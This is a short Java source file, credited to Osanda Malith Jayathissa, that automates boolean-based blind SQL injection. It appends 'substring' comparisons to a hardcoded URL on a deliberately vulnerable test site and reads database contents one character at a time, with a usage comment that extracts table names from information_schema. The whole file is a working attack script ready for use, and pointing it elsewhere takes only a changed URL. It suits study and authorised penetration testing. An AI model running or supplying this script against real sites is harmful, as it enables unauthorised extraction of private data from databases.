package bssql;

import java.net.*;
import java.io.*;

// CC-BY: Osanda Malith Jayathissa (@OsandaMalith)
// https://creativecommons.org/licenses/by/2.0/
/*
The URL and the true string is being hardcoded. After compiling run like this:
java BSSQL 20 "select table_name from information_schema.tables where table_schema=database() limit 0,1"
Result:
artists
Done! 
*/

public class BSSQL {

    private static String url = "http://testphp.vulnweb.com/artists.php?artist=2"; // your payload
    private static String trueString = "Blad3"; // Text or html in the true condition
    private static String hex;
    private static char ch;

    public static void main(String[] args) throws Exception {
        int maxLength = 0;
        String payload = "";

        if (args.length < 2) {
            System.err.println("Usage: " + BSSQL.class.getName() + " length " + "\"payload\"");
            System.exit(1);
        }

        try {
            maxLength = Integer.parseInt(args[0]);
        } catch (NumberFormatException e) {
            System.err.println("Argument" + args[0] + " must be an integer.");
            System.exit(1);
        }

        payload = args[1];

        System.out.println("Result:");
        for (int j = 1; j <= maxLength; j++) {
            for (int i = 32; i < 127; i++) {
                if (Character.isUpperCase((char) i)) {
                    continue;
                }

                ch = (char) i;

                hex = String.format("0x%2x", (int) ch);

                String p = " and substring((" + payload + ")," + Integer.toString(j) + ",1)="
                        + hex + "-- -";
                String host = url + p;

                URL target = new URL(host);
                URLConnection conn = target.openConnection();
                // conn.setRequestProperty("Cookie", "name1=value1; name2=value2");
                conn.connect();

                BufferedReader in = new BufferedReader(new InputStreamReader(
                        conn.getInputStream()));

                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    if (inputLine.contains(trueString)) {
                        System.out.print(Character.toString((char) i));
                        break;
                    }
                }

                in.close();
            }
        }
        System.out.println("\nDone!");
    }
}
